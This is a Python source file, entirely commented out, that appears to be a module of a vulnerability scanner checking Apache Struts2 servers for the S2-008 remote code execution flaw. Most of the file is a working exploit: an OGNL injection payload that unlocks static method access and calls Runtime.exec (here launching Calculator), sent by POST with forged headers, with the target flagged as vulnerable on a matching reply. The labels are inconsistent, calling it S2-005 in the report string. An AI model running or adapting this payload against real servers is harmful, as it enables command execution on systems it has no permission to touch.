# #!/usr/bin/env python
# # _*_ coding: utf-8 _*_
#
# import urllib
# import requests
#
#
#
#
# def UrlProcessing(url):
#     if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
#         res = urllib.parse.urlparse(url)
#     else:
#         res = urllib.parse.urlparse('http://%s' % url)
#     return res.scheme, res.hostname, res.port
#
# payload='''
# /devmode.action?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29)
# '''
# def S2_008(Url,RandomAgent):
#
#     scheme, url, port = UrlProcessing(Url)
#     if port is None and scheme == 'https':
#         port = 443
#     elif port is None and scheme == 'http':
#         port = 80
#     else:
#         port = port
#     payload_url = scheme+"://"+url+':'+str(port)+'/login.action'
#     host=url+':'+str(port)
#     headers = {
#         'Host':host,
#         'Accept-Encoding': 'gzip, deflate',
#         'Accept': '*/*',
#         'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
#         'User-Agent': RandomAgent,
#         'Connection': 'close',
#         'Content-Type': 'application/x-www-form-urlencoded',
#         'Content-Length': '571',
#         'DNT': '1',
#         'Referer':payload_url,
#         'Upgrade-Insecure-Requests': '1'
#     }
#     s = requests.session()
#     try:
#         resp = s.post(payload_url, data=payload,headers=headers, timeout=5, verify=False)
#         con = resp.text
#         code = resp.status_code
#         if code==200 and con.lower().find('tomcat')!=-1:
#             Medusa = "{} 存在Struts2远程代码执行漏洞\r\n漏洞详情:\r\n版本号:S2-005\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,payload)
#             return (Medusa)
#     except Exception as e:
#         pass
